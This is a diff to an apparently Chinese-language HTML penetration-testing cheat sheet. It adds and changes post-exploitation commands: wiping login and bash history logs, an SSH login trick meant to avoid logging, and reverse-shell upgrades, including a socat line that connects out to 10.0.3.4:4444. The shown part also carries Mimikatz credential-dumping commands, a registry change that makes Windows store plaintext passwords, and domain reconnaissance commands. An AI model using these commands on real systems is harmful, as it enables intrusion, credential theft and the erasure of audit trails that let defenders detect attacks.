@@ -24,13 +24,36 @@
 	清空lastb<br>
 		echo > /var/log/btmp<br>
 	清空bash记录<br>
-		echo > ./.bash_history<br>
+		history -c<br>
 	centos关闭mail发送日志<br>
 		echo "unset MAILCHECK">> /etc/profile<br>
-	<h1>Mimikatz 非交互式</h1>
+	SSH无日志登录<br>
+		ssh root@127.0.0.1 -T "/bin/sh -i"
+	<h2>linux 获得完全交互式TTY</h2>
+	方案一： python -c 'import pty; pty.spawn("/bin/bash")' <br>
+	方案二： socat file:`tty`,raw,echo=0 tcp-listen:4444  && socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 <br>
+	方案三：
+	<pre>
+	# In reverse shell
+	$ python -c 'import pty; pty.spawn("/bin/bash")'
+	Ctrl-Z
+
+	# In Kali
+	$ stty raw -echo
+	$ fg
+
+	# In reverse shell
+	$ reset
+	$ export SHELL=bash
+	$ export TERM=xterm-256color
+	$ stty rows &lt;num&gt; columns &lt;cols&gt;
+	</pre>
+
+	<h2>Mimikatz 非交互式</h2>
 	打印（输出）mimikatz执行过程的log : mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir <br>
 	读取的密码导出在mimikatz的目录输出到文本 : mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt<br>
-	<h1>域信息收集</h1>
+	关闭LSA保护记录密码（需要重启或者注销）reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br>
+	<h2>域信息收集</h2>
 	查询当前登录域：net session<br>
 	当前计算机设置的域：net config workstation<br>
 	判断主域，主域服务器都做时间服务器：net time /domain<br>
